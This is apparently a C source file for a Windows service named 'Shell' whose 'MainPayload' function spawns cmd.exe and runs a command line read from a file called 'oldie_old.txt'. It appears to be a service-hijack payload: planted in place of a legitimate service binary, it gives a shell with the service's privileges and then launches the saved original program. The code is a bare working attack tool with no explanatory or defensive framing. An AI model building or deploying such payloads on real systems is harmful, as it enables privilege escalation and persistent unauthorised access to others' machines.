#include <windows.h>
#include <stdbool.h>
#include <stdio.h>

SERVICE_STATUS service_status;
SERVICE_STATUS_HANDLE service_handle;

// Defining functions
void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);
int RunService();
int MainPayload(int, char**);

// Entrypoint for the service
int main()
{
    // Creating an entry table for the service
    SERVICE_TABLE_ENTRY service_table[] = {
        {"Shell", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };
    // Starting the service
    if (!StartServiceCtrlDispatcherA(service_table))
    {
        printf("Failed to start service\nError: %d\n", GetLastError());
        return 1;
    }
    return 0;
}

// Function that handles running the service
void ServiceMain(int argc, char** argv)
{
    // Setting service information
    service_status.dwServiceType = SERVICE_WIN32;
    service_status.dwCurrentState = SERVICE_START_PENDING;
    service_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    service_status.dwWin32ExitCode = 0;
    service_status.dwServiceSpecificExitCode = 0;
    service_status.dwCheckPoint = 0;
    service_status.dwWaitHint = 0;
    // Registering the service's control handler
    service_handle = RegisterServiceCtrlHandlerA(argv[0], (LPHANDLER_FUNCTION)ControlHandler);
    if (!service_handle)
    {
        return;
    }
    // Setting the service's status to running
    service_status.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(service_handle, &service_status);
    // Running the main payload
    MainPayload(argc, argv);
}

// Handles the starting and stopping of this service from the OS
void ControlHandler(DWORD request)
{
    if (request == SERVICE_CONTROL_STOP)
    {
        service_status.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(service_handle, &service_status);
        return;
    }
    SetServiceStatus(service_handle, &service_status);
}

// Function that runs and handles the main payload
int MainPayload(int argc, char** argv)
{
    PROCESS_INFORMATION process_info = { 0 };
    STARTUPINFO start_info = { 0 };
    start_info.cb = sizeof(start_info);
    CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &start_info, &process_info);
    FILE* fptr;
    fptr = fopen("oldie_old.txt", "r");
    if (fptr)
    {
        char buffer[MAX_PATH * 2];
        if (fgets(buffer, sizeof(buffer), fptr))
        {
            buffer[strcspn(buffer, "\r\n")] = 0;
            char command[MAX_PATH * 2];
            snprintf(command, sizeof(command), "\"%s\"", buffer);
            system(command);
        }
        fclose(fptr);
    }
    WaitForSingleObject(process_info.hProcess, INFINITE);
    WaitForSingleObject(process_info.hThread, INFINITE);
    return 0;
}
